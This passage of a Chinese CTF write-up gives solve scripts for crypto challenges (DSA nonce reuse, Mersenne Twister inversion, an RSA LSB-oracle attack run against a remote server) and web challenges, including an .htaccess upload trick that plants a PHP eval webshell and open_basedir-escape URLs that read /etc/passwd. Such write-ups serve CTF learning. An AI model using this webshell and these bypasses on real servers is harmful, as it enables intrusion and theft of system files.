class="number">76447611971473350019028042637993930502</span></span><br><span class="line"></span><br><span class="line">r= <span class="number">1110285731834476772119910400331516120389395795749</span></span><br><span class="line"></span><br><span class="line">dm=m1-m0</span><br><span class="line">ds=s1-s0</span><br><span class="line"></span><br><span class="line">k = gmpy2.mul(dm, gmpy2.invert(ds, q))</span><br><span class="line">k = gmpy2.f_mod(k, q)</span><br><span class="line">tmp = gmpy2.mul(k, s0) - m0</span><br><span class="line">x = tmp * gmpy2.invert(r, q)</span><br><span class="line">x = gmpy2.f_mod(x, q)</span><br><span class="line"></span><br><span class="line">data5=<span class="string">"""And nothing 'gainst Time's scythe can make defence"""</span></span><br><span class="line"></span><br><span class="line">kinv = _modinv(k, q)</span><br><span class="line">h = hashlib.md5(data5.encode()).digest()</span><br><span class="line">h = int.from_bytes(h, <span class="string">"big"</span>)</span><br><span class="line">s = kinv * (h + r * x) % q</span><br><span class="line">print(<span class="string">"("</span>+str(r)+<span class="string">"L, "</span>+str(int(s))+<span class="string">"L)"</span>)</span><br><span class="line"><span class="comment">#flag：flag&#123;Wh4t_a_Prety_Si3nature!&#125;</span></span><br></pre></td></tr></table></figure></p><h2><span id="mt">mt</span></h2><p>出题人加密很直观，明文不断的加密，最终的还是明文，所以直奔主题，payload如下： <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Random <span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">from</span> Crypto.Util <span class="keyword">import</span> number</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">convert</span><span class="params">(m)</span>:</span></span><br><span class="line">    m = m ^ m &gt;&gt; <span class="number">13</span></span><br><span class="line">    m = m ^ m &lt;&lt; <span class="number">9</span> &amp; <span class="number">2029229568</span></span><br><span class="line">    m = m ^ m &lt;&lt; <span class="number">17</span> &amp; <span class="number">2245263360</span></span><br><span class="line">    m = m ^ m &gt;&gt; <span class="number">19</span></span><br><span class="line">    <span class="keyword">return</span> m</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">transform</span><span class="params">(message)</span>:</span></span><br><span class="line">    new_message = <span class="string">''</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(len(message) / <span class="number">4</span>):</span><br><span class="line">        block = message[i * <span class="number">4</span> : i * <span class="number">4</span> +<span class="number">4</span>]</span><br><span class="line">        block = number.bytes_to_long(block)</span><br><span class="line">        block = convert(block)</span><br><span class="line">        block = number.long_to_bytes(block, <span class="number">4</span>)</span><br><span class="line">        new_message += block</span><br><span class="line">    <span class="keyword">return</span> new_message</span><br><span class="line">c1 = <span class="string">'641460a9'</span></span><br><span class="line">c2 = <span class="string">'e3953b1a'</span></span><br><span class="line">c3 = <span class="string">'aa21f3a2'</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decode</span><span class="params">(c)</span>:</span></span><br><span class="line"> x = c</span><br><span class="line"> <span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">     xx = x</span><br><span class="line">     x = transform(x.decode(<span class="string">'hex'</span>)).encode(<span class="string">'hex'</span>)</span><br><span class="line">     <span class="keyword">if</span> x == c:</span><br><span class="line">         <span class="keyword">return</span> xx</span><br><span class="line"></span><br><span class="line">print(decode(c1)+decode(c2)+decode(c3))</span><br><span class="line"><span class="comment">#flag&#123;84b45f89af22ce7e67275bdc&#125;</span></span><br></pre></td></tr></table></figure></p><h2><span id="rsa">RSA</span></h2><p>lsb Oracal attack</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> md5</span><br><span class="line"><span class="keyword">import</span> decimal</span><br><span class="line">a = <span class="number">0</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">oracle</span><span class="params">(num)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">"Please input your option:"</span>)</span><br><span class="line">    p.sendline(<span class="string">"D"</span>)</span><br><span class="line">    p.recvuntil(<span class="string">"Your encrypted message:"</span>)</span><br><span class="line">    p.sendline(str(num))</span><br><span class="line">    p.recvuntil(<span class="string">"The plain of your decrypted message is "</span>)</span><br><span class="line">    lsb = p.recv(<span class="number">3</span>)</span><br><span class="line">    <span class="keyword">return</span> lsb == <span class="string">'odd'</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">partial</span><span class="params">(c,e,n)</span>:</span></span><br><span class="line">    k = n.bit_length()</span><br><span class="line">    decimal.getcontext().prec = k  <span class="comment"># for 'precise enough' floats</span></span><br><span class="line">    lo = decimal.Decimal(<span class="number">0</span>)</span><br><span class="line">    hi = decimal.Decimal(n)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(k):</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> oracle(c):</span><br><span class="line">            hi = (lo + hi) / <span class="number">2</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            lo = (lo + hi) / <span class="number">2</span></span><br><span class="line">        c = (c * pow(<span class="number">2</span>, e, n)) % n</span><br><span class="line">        <span class="keyword">print</span> i, int(hi - lo)</span><br><span class="line">    <span class="keyword">return</span> int(hi)</span><br><span class="line"></span><br><span class="line">s = <span class="string">"0123456789abcdefABCDEF"</span></span><br><span class="line">p = remote(<span class="string">"47.111.59.243"</span>,<span class="string">"9421"</span>)</span><br><span class="line">p.recvuntil(<span class="string">"[*] Please find a string that md5(str + "</span>)</span><br><span class="line">salt = p.recv(<span class="number">4</span>)</span><br><span class="line">p.recvuntil(<span class="string">"[0:5] == "</span>)</span><br><span class="line">part_hash = p.recv(<span class="number">5</span>)</span><br><span class="line">found = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> s:</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> s:</span><br><span class="line">        <span class="keyword">for</span> k <span class="keyword">in</span> s:</span><br><span class="line">            <span class="keyword">for</span> l <span class="keyword">in</span> s:</span><br><span class="line">                <span class="keyword">for</span> m <span class="keyword">in</span> s:</span><br><span class="line">                    ss = i+j+k+l+m</span><br><span class="line">                    <span class="keyword">if</span> md5(ss+salt).hexdigest()[:<span class="number">5</span>] == part_hash:</span><br><span class="line">                        found = <span class="number">1</span></span><br><span class="line">                        <span class="keyword">break</span></span><br><span class="line">                <span class="keyword">if</span> found:</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">if</span> found:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> found:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">if</span> found:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">"&gt; "</span>)</span><br><span class="line">p.sendline(ss)</span><br><span class="line">p.recvuntil(<span class="string">"Guess the Secrets 3 times, Then you will get the flag!\n"</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">3</span>):</span><br><span class="line">    R = p.recvline().strip()</span><br><span class="line">    p.recvuntil(<span class="string">"n = "</span>)</span><br><span class="line">    n = eval(p.recvline().strip())</span><br><span class="line">    p.recvuntil(<span class="string">"e = "</span>)</span><br><span class="line">    e = eval(p.recvline().strip())</span><br><span class="line">    p.recvuntil(<span class="string">"The Encypted secret:"</span>)</span><br><span class="line">    p.recvuntil(<span class="string">"c = "</span>)</span><br><span class="line">    c = eval(p.recvline().strip())</span><br><span class="line">    c_of_2 = pow(<span class="number">2</span>,e,n)</span><br><span class="line">    m = partial((c*c_of_2)%n,e,n)</span><br><span class="line">    p.recvuntil(<span class="string">"Please input your option:"</span>)</span><br><span class="line">    p.sendline(<span class="string">"G"</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'The secret:'</span>)</span><br><span class="line">    p.sendline(str(m))</span><br><span class="line">    s = p.recvline().strip()</span><br><span class="line">    print(s)</span><br><span class="line">    log.success(s+<span class="string">' '</span>+R+<span class="string">" success!"</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h1><span id="web">web</span></h1><h2><span id="checkin">CheckIn</span></h2><p>题目功能是一个文件上传，可以上传jpg、png等文件，但是限制了php，而且还判断了上传的文件头，使用exif_image来判断的，这个很容易绕过，直接随便加一个图片文件头就行，并且上传之后会给出文件所在目录</p><figure><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190819145315-04ce33a8-c24e-1.png" alt><figcaption>1.png</figcaption></figure><figure><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190819145317-05d44cb0-c24e-1.png" alt><figcaption>2.png</figcaption></figure><figure><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190819145322-09089396-c24e-1.png" alt><figcaption>3.png</figcaption></figure><p>尝试了.htaccess，发现不行，队里师傅突然说用<code>.user.ini</code>orz，第一次见还能这么做。先发下p牛的链接</p><p><a href="https://wooyun.js.org/drops/user.ini文件构成的PHP后门.html" target="_blank" rel="noopener">.user.ini文件构成的PHP后门</a></p><figure><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190819145324-0a3d8f64-c24e-1.png" alt><figcaption>4.png</figcaption></figure><figure><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190819145326-0b2e9526-c24e-1.png" alt><figcaption>5.png</figcaption></figure><figure><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190819145330-0da74370-c24e-1.png" alt><figcaption>6.png</figcaption></figure><h2><span id="easyphp">EasyPHP</span></h2><p><a href="https://blog.zeddyu.info/2019/07/20/isitdtu-2019/" target="_blank" rel="noopener">ISITDTU CTF 2019 EasyPHP 回顾</a></p><p>找到一篇类似的题，但是这里长度限制了18，太狠了，还过滤了字母数字。</p><figure><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190819145339-13215b10-c24e-1.png" alt><figcaption>9.png</figcaption></figure><p>于是谷歌了一番，找到了Smi1e师傅的一篇<a href="https://www.smi1e.top/php不使用数字字母和下划线写shell/" target="_blank" rel="noopener">文章</a>，结合陆队的blog，找到了思路</p><figure><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190819145332-0f31b284-c24e-1.png" alt><figcaption>7.png</figcaption></figure><figure><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190819145337-11c75a26-c24e-1.png" alt><figcaption>8.png</figcaption></figure><p>经过摸索，找到payload</p>${&#37;A0&#37;B8&#37;BA&#37;AB^&#37;ff&#37;ff&#37;ff&#37;ff}{&#37;A0}();&&#37;A0=get_the_flag<p>接下来就是上传了，说一下流程，上传一个.htaccess，然后getshell，直接贴脚本了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">SIZE_HEADER = <span class="string">b"\n\n#define width 1337\n#define height 1337\n\n"</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">generate_php_file</span><span class="params">(filename, script)</span>:</span></span><br><span class="line">    phpfile = open(filename, <span class="string">'wb'</span>)</span><br><span class="line"></span><br><span class="line">    phpfile.write(script.encode(<span class="string">'utf-16be'</span>))</span><br><span class="line">    phpfile.write(SIZE_HEADER)</span><br><span class="line"></span><br><span class="line">    phpfile.close()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">generate_htacess</span><span class="params">()</span>:</span></span><br><span class="line">    htaccess = open(<span class="string">'.htaccess'</span>, <span class="string">'wb'</span>)</span><br><span class="line"></span><br><span class="line">    htaccess.write(SIZE_HEADER)</span><br><span class="line">    htaccess.write(<span class="string">b'AddType application/x-httpd-php .south\n'</span>)</span><br><span class="line">    htaccess.write(<span class="string">b'php_value zend.multibyte 1\n'</span>)</span><br><span class="line">    htaccess.write(<span class="string">b'php_value zend.detect_unicode 1\n'</span>)</span><br><span class="line">    htaccess.write(<span class="string">b'php_value display_errors 1\n'</span>)</span><br><span class="line"></span><br><span class="line">    htaccess.close()</span><br><span class="line"></span><br><span class="line">generate_htacess()</span><br><span class="line">generate_php_file(<span class="string">"webshell.south"</span>, <span class="string">"&lt;?php eval($_GET['cmd']); die(); ?&gt;"</span>)</span><br></pre></td></tr></table></figure><p>把文件上传上去之后得到shell，发现有<code>open_basedir</code>，这里想到0CTF-TCTF final的绕过<code>open_basedir</code>任意文件读取</p><p><code>http://47.111.59.243:9001/upload/tmp_cc54f9a65160d1015e9d4b96601f1274/webshell.south?cmd=mkdir("/tmp/fuck");chdir('/tmp/fuck/');ini_set('open_basedir','..');chdir('..');chdir('..');chdir('..');chdir('..');ini_set('open_basedir','/');var_dump(file_get_contents("/etc/passwd"));</code></p><figure><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190819145346-1716da7e-c24e-1.png" alt><figcaption>12.png</figcaption></figure><p><code>http://47.111.59.243:9001/upload/tmp_cc54f9a65160d1015e9d4b96601f1274/webshell.south?cmd=mkdir("/tmp/fuck");chdir('/tmp/fuck/');ini_set('open_basedir','..');chdir('..');chdir('..');chdir('..');chdir('..');ini_set('open_basedir','/');var_dump(scandir("/"));</code></p><figure><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190819145346-177d14e2-c24e-1.png" alt><figcaption>13.png</figcaption></figure><p><code>http://47.111.59.243:9001/upload/tmp_cc54f9a65160d1015e9d4b96601f1274/webshell.south?cmd=mkdir("/tmp/fuck");chdir('/tmp/fuck/');ini_set('open_basedir','..');chdir('..');chdir('..');chdir('..');chdir('..');ini_set('open_basedir','/');readfile("/THis_Is_tHe_F14g"));</code></p><figure><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190819145348-186f5a22-c24e-1.png" alt><figcaption>14.png</figcaption></figure><h2><span id="upload-labs-2">Upload labs 2</span></h2><p>这道题开放了不久，给了源码，接着审计一波,index.php上传这里没啥限制，限制了文件后缀</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#index.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">'class.php'</span>;</span><br><span class="line"></span><br><span class="line">$userdir = <span class="string">"upload/"</span> . md5($_SERVER[<span class="string">"REMOTE_ADDR"</span>]);</span><br><span class="line"><span class="keyword">if</span> (!file_exists($userdir)) &#123;</span><br><span class="line">    mkdir($userdir, <span class="number">0777</span>, <span class="keyword">true</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">"upload"</span>])) &#123;</span><br><span class="line">    <span class="comment">// 允许上传的图片后缀</span></span><br><span class="line">    $allowedExts = <span class="keyword">array</span>(<span class="string">"gif"</span>, <span class="string">"jpeg"</span>, <span class="string">"jpg"</span>, <span class="string">"png"</span>);</span><br><span class="line">    $tmp_name = $_FILES[<span class="string">"file"</span>][<span class="string">"tmp_name"</span>];</span><br><span class="line">    $file_name = $_FILES[<span class="string">"file"</span>][<span class="string">"name"</span>];</span><br><span class="line">    $temp = explode(<span class="string">"."</span>, $file_name);</span><br><span class="line">    $extension = end($temp);</span><br><span class="line">    <span class="keyword">if</span> ((($_FILES[<span class="string">"file"</span>][<span class="string">"type"</span>] == <span class="string">"image/gif"</span>)</span><br><span class="line">            || ($_FILES[<span class="string">"file"</span>][<span class="string">"type"</span>] == <span class="string">"image/jpeg"</span>)</span><br><span class="line">            || ($_FILES[<span class="string">"file"</span>][<span class="string">"type"</span>] == <span class="string">"image/png"</span>))</span><br><span class="line">        &amp;&amp; ($_FILES[<span class="string">"file"</span>][<span class="string">"size"</span>] &lt; <span class="number">204800</span>)   <span class="comment">// 小于 200 kb</span></span><br><span class="line">        &amp;&amp; in_array($extension, $allowedExts)</span><br><span class="line">    ) &#123;</span><br><span class="line">        $c = <span class="keyword">new</span> Check($tmp_name);</span><br><span class="line">        $c-&gt;check();</span><br><span class="line">        <span class="keyword">if</span> ($_FILES[<span class="string">"file"</span>][<span class="string">"error"</span>] &gt; <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"错误：: "</span> . $_FILES[<span class="string">"file"</span>][<span class="string">"error"</span>] . <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">            <span class="keyword">die</span>();</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            move_uploaded_file($tmp_name, $userdir . <span class="string">"/"</span> . md5($file_name) . <span class="string">"."</span> . $extension);</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"文件存储在: "</span> . $userdir . <span class="string">"/"</span> . md5($file_name) . <span class="string">"."</span> . $extension;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"非法的文件格式"</span>;</span><br><span class="line">    &#125;   </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>func.php接受一个url参数，参数经过一个很狠的正则，会去你上传的目录找你上传的文件，获取MIME返回。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># func.php</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">"submit"</span>]) &amp;&amp; <span class="keyword">isset</span>($_POST[<span class="string">"url"</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">'/^(ftp|zlib|data|glob|phar|ssh2|compress.bzip2|compress.zlib|rar|ogg|expect)(.|\\s)*|(.|\\s)*(file|data|\.\.)(.|\\s)*/i'</span>,$_POST[<span class="string">'url'</span>]))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"Go away!"</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        $file_path = $_POST[<span class="string">'url'</span>];</span><br><span class="line">        $file = <span class="keyword">new</span> File($file_path);</span><br><span class="line">        $file-&gt;getMIME();</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"&lt;p&gt;Your file type is '$file' &lt;/p&gt;"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>class.php这里的File的__wakeup函数很异常，预计就是题目考点了，作用是创建一个类的新实例，给出的参数将传递到类的构造函数。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#class.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">'config.php'</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">File</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> $file_name;</span><br><span class="line">    <span class="keyword">public</span> $type;</span><br><span class="line">    <span class="keyword">public</span> $func = <span class="string">"Check"</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($file_name)</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;file_name = $file_name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span><span class="params">()</span></span>&#123;</span><br><span class="line">        $class = <span class="keyword">new</span> ReflectionClass(<span class="keyword">$this</span>-&gt;func);</span><br><span class="line">        $a = $class-&gt;newInstanceArgs(<span class="keyword">$this</span>-&gt;file_name);</span><br><span class="line">        $a-&gt;check();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">getMIME</span><span class="params">()</span></span>&#123;</span><br><span class="line">        $finfo = finfo_open(FILEINFO_MIME_TYPE);</span><br><span class="line">        <span class="keyword">$this</span>-&gt;type = finfo_file($finfo, <span class="keyword">$this</span>-&gt;file_name);</span><br><span class="line">        finfo_close($finfo);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__toString</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;type;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Check</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> $file_name;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($file_name)</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;file_name = $file_name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">check</span><span class="params">()</span></span>&#123;</span><br><span class="line">        $data = file_get_contents(<span class="keyword">$this</span>-&gt;file_name);</span><br><span class="line">        <span class="keyword">if</span> (mb_strpos($data, <span class="string">"&lt;?"</span>) !== <span class="keyword">FALSE</span>) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">"&amp;lt;? in contents!"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>接下来这个admin.php，需要一个ssrf然后，之后会触发getflag函数把flag发到你服务器上</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#admin.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">'config.php'</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Ad</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> $ip;</span><br><span class="line">    <span class="keyword">public</span> $port;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> $clazz;</span><br><span class="line">    <span class="keyword">public</span> $func1;</span><br><span class="line">    <span class="keyword">public</span> $func2;</span><br><span class="line">    <span class="keyword">public</span> $func3;</span><br><span class="line">    <span class="keyword">public</span> $instance;</span><br><span class="line">    <span class="keyword">public</span> $arg1;</span><br><span class="line">    <span class="keyword">public</span> $arg2;</span><br><span class="line">    <span class="keyword">public</span> $arg3;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($ip, $port, $clazz, $func1, $func2, $func3, $arg1, $arg2, $arg3)</span></span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">$this</span>-&gt;ip = $ip;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;port = $port;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;clazz = $clazz;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;func1 = $func1;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;func2 = $func2;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;func3 = $func3;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;arg1 = $arg1;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;arg2 = $arg2;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;arg3 = $arg3;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">check</span><span class="params">()</span></span>&#123;</span><br><span class="line"></span><br><span 